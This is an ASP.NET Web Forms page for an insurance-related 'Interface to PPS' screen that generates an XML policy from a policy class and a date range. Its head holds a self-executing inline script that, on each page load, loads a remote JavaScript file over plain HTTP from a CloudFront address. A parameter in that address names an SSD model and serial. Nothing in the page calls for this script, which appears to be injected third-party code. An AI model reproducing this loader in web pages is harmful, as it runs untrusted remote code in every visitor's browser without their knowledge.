<%@ Page Language="C#" AutoEventWireup="true" CodeFile="XMLPolicy.aspx.cs" Inherits="XMLPolicy" %>

<%@ Register Assembly="MaskedInput" Namespace="MaskedInput" TagPrefix="cc1" %>
<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
        .over-top-btn
        {
            width: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>
</head>
<body>
    <form id="Form2" method="post" runat="server">
    <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ToolkitScriptManager2" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <asp:Literal ID="jvscript" runat="server"></asp:Literal>
                <div class="row row-offcanvasrow-offcanvas-left" style="height: 100%">
                    <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            Interface to PPS</h1>
                        <div class="form=group" align="center">
                            <asp:Button ID="BtnGenerate" runat="server" OnClick="BtnGenerate_Click" Text="Generate"
                                Width="155px" CssClass="btn btn-primary btn-lg" />
                            <br />
                            <br />
                            <div align="left">
                                <asp:Label ID="Label8" runat="server" Font-Bold="True">Generate XML Policy</asp:Label>
                            </div>
                        </div>
                        <div class="form-group" align="center">
                            <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                DisplayAfter="10">
                                <ProgressTemplate>
                                    <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                    <span><span class=""></span><span class="" style="font-size: 18px">Please wait...</span></span></ProgressTemplate>
                            </asp:UpdateProgress>
                        </div>
                        <div class="row formWraper" style="padding: 0px;" align="center">
                            <div class="col-sm-12" align="center">
                                <br />
                                <asp:Label ID="Label1" runat="server" CssClass="labelForControl">Policy Class</asp:Label>
                                <br />
                                <Toolkit:CalendarExtender ID="CalendarExtender3" runat="server" Format="MM/dd/yyyy"
                                    PopupButtonID="ImgCalendar" TargetControlID="BeginDate"  CssClass="Calendar">
                                </Toolkit:CalendarExtender>
                                <asp:DropDownList ID="ddlPolicy" runat="server" AutoPostBack="True" CssClass="form-controlWhite" Width="300px"
                                    Font-Names="Arial Narrow" TabIndex="1014" TxtCity="" 
                                    OnSelectedIndexChanged="ddlPolicy_SelectedIndexChanged">
                                </asp:DropDownList>
                                <br />
                                <br />
                                <asp:Label ID="Label5" runat="server" Text="Date From" CssClass="labelForControl"></asp:Label>
                                <br />
                                <Toolkit:CalendarExtender ID="CalendarExtender1" runat="server" Format="MM/dd/yyyy"
                                    PopupButtonID="ImageButton1" TargetControlID="EndDate"  CssClass="Calendar">
                                </Toolkit:CalendarExtender>
                                <asp:TextBox ID="BeginDate" runat="server" CssClass="form-controlWhite" Width="300px"></asp:TextBox>
                                <asp:ImageButton ID="ImgCalendar" runat="server" ImageUrl="~/Images2/Calendar.png"
                                    TabIndex="15" Width="25px" Height="25px"/>
                                <br />
                                <br />
                                <asp:Label ID="Label6" runat="server" Text="To" CssClass="labelForControl"></asp:Label>
                                <br />
                                <asp:TextBox ID="EndDate" runat="server" CssClass="form-controlWhite" Width="300px"></asp:TextBox>
                                <asp:ImageButton ID="ImageButton1" runat="server" ImageUrl="~/Images2/Calendar.png"
                                    TabIndex="15" Width="25px" Height="25px"/>
                                <br />
                                <br />
                                <asp:Label ID="Label7" runat="server" Font-Size="Medium"></asp:Label>

                                <img alt="" src="Images2/GreyLine.png" style="height: 6px; margin-top: 0px;" width="90%" />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                            </div>
                        </div>
                        <asp:Panel ID="pnlMessage" runat="server" CssClass="" Width="450px" BackColor="#F4F4F4"
                            Height="260px">
                            <div class="" style="padding: 0px; border-radius: 5px; background-color: #036893;
                                color: #FFFFFF; font-family: tahoma; font-size: 14px; font-weight: normal; font-style: normal;
                                background-repeat: no-repeat; text-align: left; vertical-align: bottom;">
                                &nbsp;&nbsp;
                                <asp:Label ID="Label27" runat="server" Font-Bold="False" Font-Italic="False" Font-Names="arialnarrow"
                                    Font-Size="14pt" Text="Message..." ForeColor="White" />
                            </div>
                            <div>
                                <table style="background-position: center; width: 430px; height: 175px;">
                                    <tr>
                                        <td align="center" valign="middle">
                                            <asp:Label ID="lblRecHeader" runat="server" Font-Bold="False" Font-Italic="False"
                                                Font-Size="10.5pt" Font-Underline="False" ForeColor="#333333" Text="Message"
                                                Width="350px" CssClass="Labelfield2-14" />
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div class="" align="center">
                                <asp:Button ID="btnAceptar" runat="server" Text="OK" Width="150px" CssClass="btn btn-primary btn-lg btn-block" />
                            </div>
                        </asp:Panel>
                        <Toolkit:ModalPopupExtender ID="mpeSeleccion" runat="server" BackgroundCssClass="modalBackground"
                            DropShadow="True" PopupControlID="pnlMessage" TargetControlID="btnDummy2" OkControlID="btnAceptar">
                        </Toolkit:ModalPopupExtender>
                        <asp:Button ID="btnDummy2" runat="server" Visible="true" BackColor="Transparent"
                            BorderStyle="None" BorderWidth="0" BorderColor="Transparent" />
                        <Toolkit:RoundedCornersExtender ID="RoundedCornersExtender2" runat="server" TargetControlID="pnlMessage"
                            Radius="10" Corners="All" />
                    </div>
                    <cc1:MaskedTextHeader ID="MaskedTextHeader1" runat="server"></cc1:MaskedTextHeader>
                    <<asp:Literal ID="litPopUp" runat="server" Visible="False"></asp:Literal>
                </div>
            </ContentTemplate>
        </asp:UpdatePanel>
    </div>
    </form>
    <script>
        $(document).ready(function () {
            $('#BeginDate').mask('00/00/0000', { placeholder: '__/__/____' });
            $('#EndDate').mask('00/00/0000', { placeholder: '__/__/____' });
            //                $('#TxtExpBinderDate').mask('00/00/0000', { placeholder: '__/__/____' });
            //                $('#TxtDriverBirthDate').mask('00/00/0000', { placeholder: '__/__/____' });
            //                $('#TxtWorkPhone').mask('(000) 000-0000', { placeholder: '(###) ###-####' });
            //                $('#TxtCellPhone').mask('(000) 000-0000', { placeholder: '(###) ###-####' });

        });
    </script>
</body>
</html>
